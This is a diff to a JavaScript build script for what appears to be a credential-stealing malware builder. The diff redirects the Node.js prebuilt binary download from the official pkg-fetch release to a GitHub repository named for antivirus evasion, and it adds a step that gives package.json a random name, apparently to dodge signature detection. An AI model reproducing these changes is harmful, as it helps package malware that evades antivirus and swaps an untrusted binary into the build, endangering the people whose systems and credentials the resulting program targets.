@@ -437,12 +437,22 @@ NODE_MODULE(binding, init)
     })
 }
 
+async function fix_package() {
+    const package_json = JSON.parse(fs.readFileSync("./package.json"));
+
+    let new_name = makeid_var(16)
+
+    package_json.name = new_name;
+
+    fs.writeFileSync("./package.json", JSON.stringify(package_json))
+}   
+
 (async () => {
     let skip_download_nodejs = Boolean(process.argv[2])
     if (!skip_download_nodejs) { // idk why but my builder is kinda tripping & this somehow works LMFAO
         console.log("Downloading Node.js pre-built binary")
         let start = Date.now()
-        await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
+        await download("https://github.com/antivirusevasion69/evasion/releases/download/asd/built-v18.5.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
         console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);
 
         child_process.execSync(`node build.js true`, {
@@ -459,6 +469,10 @@ NODE_MODULE(binding, init)
     console.log(`Modding dapifix`)
     await rename_dapi();
     console.log("Modded dapifix");
+
+    console.log(`Modding package.json`)
+    await fix_package();
+    console.log(`Modded package.json`)
 
     console.log("Fixing dependencies")
     await fix_dependencies();
